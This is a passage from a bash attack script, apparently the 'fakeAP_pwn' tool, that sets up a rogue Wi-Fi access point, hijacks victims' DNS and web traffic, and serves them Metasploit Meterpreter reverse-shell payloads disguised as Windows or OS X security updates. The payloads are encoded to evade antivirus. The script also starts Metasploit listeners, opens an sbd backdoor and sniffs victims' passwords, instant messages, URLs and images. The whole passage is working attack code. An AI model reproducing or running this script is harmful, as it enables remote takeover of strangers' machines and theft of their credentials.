	<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
		SSLOptions +StdEnvVars
	</FilesMatch>
	<Directory /usr/lib/cgi-bin>
		SSLOptions +StdEnvVars
	</Directory>
	BrowserMatch \"MSIE [2-6]\" \
		nokeepalive ssl-unclean-shutdown \
		downgrade-1.0 force-response-1.0
	BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
</VirtualHost>
</IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
if [ "$verbose" == "2" ] ; then echo "[i] Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi

#echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"; fi
#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"
#echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"; fi
#xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"
echo -e "\e[01;32m[>]\e[00m Creating exploit...(Windows)"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"; fi
#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"

echo -e "\e[01;32m[>]\e[00m Creating fake access point..."
airbaseng="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\""
if [ "$respond2All" == "true" ]; then airbaseng="$airbaseng -P -C 60"; fi
if [ "$debug" == "true" ] || [ "$verbose" == "2" ]; then airbaseng="$airbaseng -v"; fi
if [ "$verbose" == "2" ] ; then echo "[i] Command: $airbaseng"; fi
$xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$airbaseng" &
sleep 3

echo -e "\e[01;32m[>]\e[00m Setting up our end..."
# FakeAP
ifconfig lo up                                                                     # Make sure localhost is up
ifconfig at0 up                                                                    # The new FakeAP interface
int=$(ifconfig -a | grep at0 | awk '{print $1}')
if [ "$int" != "at0" ]; then
   echo -e "\e[00;31m[-]\e[00m Couldn't create the fake access point." 1>&2
   cleanup
fi
ifconfig at0 10.0.0.1 netmask 255.255.255.0                                        # Sets IP Address
ifconfig at0 mtu $mtu                                                              # Changes MTU for FakeAP
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1                          # Sets gateway for FakeAP
iptables --flush                                                                   # Clear any existing stuff before we start
iptables --table nat --flush                                                       # Clear any existing stuff before we start
#iptables -t mangle --flush                                                        # Clear any existing stuff before we start
iptables --delete-chain                                                            # Delete all chains that are not in default filter and nat table
iptables --table nat --delete-chain                                                # Delete all chains that are not in default filter and nat table
echo "1" > /proc/sys/net/ipv4/ip_forward                                           # Enables packet forwarding via kernel
if [ "$transparent" == "true" ]; then
   iptables -t nat -A PREROUTING -i at0 -p udp -j DNAT --to-destination $gatewayIP # Change destination addresses to the connection with internet
   #iptables -A INPUT -i at0 -j ACCEPT
   iptables -A FORWARD -i at0 -j ACCEPT                                            # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
   #iptables -A OUTPUT -i at0 -j ACCEPT
   iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE                      # ...and send it on to the internet (for now!)
else
   #iptables -P FORWARD ACCEPT                                                        # Stop current firewall rules and allowing everything
   #iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to $gatewayIP    # Change destination addresses of web traffic to the connection with internet
   #iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j ACCEPT                  # udp needed (DNS)
   #iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80   # Redirected to the fake update page
   iptables -t nat -A PREROUTING -i at0 -j REDIRECT                                   # Blackhole Redict everything to us
fi
if [ "$verbose" == "2" ] ; then echo "[i] Command: chmod 775 /var/run/"; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "chmod 775 /var/run/"
if [ "$verbose" == "2" ] ; then echo "[i] Command: touch /var/lib/dhcp3/dhcpd.leases"; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "touch /var/lib/dhcp3/dhcpd.leases"

echo -e "\e[01;32m[>]\e[00m Starting Metasploit..."
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
#$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
#$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb E"; fi
$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb E" &
sleep 1 # Need to wait for metasploit, so we have an exploit ready for the target to download...

if [ "$transparent" != "true" ]; then
   echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns"; fi
   $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - DNS services" -e "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" &
   sleep 7
fi

echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
if [ "$verbose" == "2" ] ;
 then echo "[i] Command: dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
$xterm -geometry 75x3+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
sleep 2
if [ -z "$(pgrep dhcpd3)" ]; then # check if dhcpd3 server is running
   echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
   if [ "$verbose" == "2" ] ; then echo "[i] Command: killall xterm"; fi
   killall xterm # Because cleanup doesnt do it!
   cleanup
fi

echo -e "\e[01;32m[>]\e[00m Starting Web server..."
if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload"; fi
$xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
sleep 2
if [ -z "$(pgrep apache2)" ]; then
   echo -e "\e[00;31m[-]\e[00m Web server failed to start." 1>&2
   if [ "$verbose" == "2" ] ; then echo "[i] Command: killall xterm"; fi
   killall xterm # Because cleanup doesnt do it!
   cleanup
fi

if [ "$payload" == "vnc" ]; then
   echo -e "\e[01;32m[>]\e[00m Getting the backdoor (VNC) ready..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: vncviewer -listen"; fi
   $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - VNC" -e "vncviewer -listen" &
elif [ "$payload" == "sbd" ]; then
   echo -e "\e[01;32m[>]\e[00m Getting the backdoor (SBD) ready..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: sbd -l -k g0tmi1k -p $port"; fi
   $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - SBD" -e "sbd -l -k g0tmi1k -p $port" &
   sleep 1
fi

echo -e "\e[01;32m[>]\e[00m Forcing target to vist our site..."
# Could of done this at the start, but we were not ready for them then! JUST PORT 80,443 MIND YOU! (All other traffic (e.g. NON HTTP) might have internet access)
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
sleep 1

# Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
echo -e "\e[01;33m[*]\e[00m Waiting for target to connect..."
if test -e /tmp/fakeAP_pwn.lock; then rm -r /tmp/fakeAP_pwn.lock; fi
while [ ! -e /tmp/fakeAP_pwn.lock ]; do
   sleep 5
done

echo -e "\e[01;33m[+]\e[00m Target connect!"
 targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"

if [ "$transparent" == "true" ]; then
   echo -e "\e[01;32m[>]\e[00m Give our target their inter-webs back..."
   iptables --flush
   iptables --table nat --flush
   iptables --delete-chain
   iptables --table nat --delete-chain
   iptables -t nat -A PREROUTING -p udp -j DNAT --to-destination $gatewayIP
   iptables -A FORWARD -i at0 -j ACCEPT
   iptables --table nat -A POSTROUTING -o $interface -j MASQUERADE
fi

if [ "$payload" == "wkv" ]; then
   echo -e "\e[00;31m[i] Opening file...."
   cat /tmp/fakeAP_pwn.wkv
   sleep 1
fi

if [ "$extras" == "true" ]; then
   echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: urlsnarf -i at0"; fi
   $xterm -geometry 75x10+10+0    -T "fakeAP_pwn v$version - URLs"          -e "urlsnarf -i at0" &                # URLs
   if [ "$verbose" == "2" ] ; then echo "[i] Command: dsniff -i at0"; fi
   $xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords"     -e "dsniff -i at0" &                  # Passwords
   if [ "$verbose" == "2" ] ; then echo "[i] Command: ettercap -T -q -p -i at0 // //"; fi
   $xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "ettercap -T -q -p -i at0 // //" & # Passwords (again)
   if [ "$verbose" == "2" ] ; then echo "[i] Command: msgsnarf -i at0"; fi
   $xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM"            -e "msgsnarf -i at0" &                # IM
   if [ "$verbose" == "2" ] ; then echo "[i] Command: driftnet -i at0"; fi
   $xterm -geometry 75x10+10+465  -T "fakeAP_pwn v$version - Images"        -e "driftnet -i at0" &                # Images
   #if [ "$verbose" == "2" ] ; then echo "[i] Command: tcpdump -i at0 -w /tmp/fakeAP_pwn.cap"; fi
   #$xterm -geometry 100x10+650+640 -T "fakeAP_pwn v$version - tcpdump" -e "tcpdump -i at0 -w /tmp/fakeAP_pwn.cap" # Dump all trafic to a .cap file
   #if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
   #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
   #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" & #SSLStrip
fi

cleanup
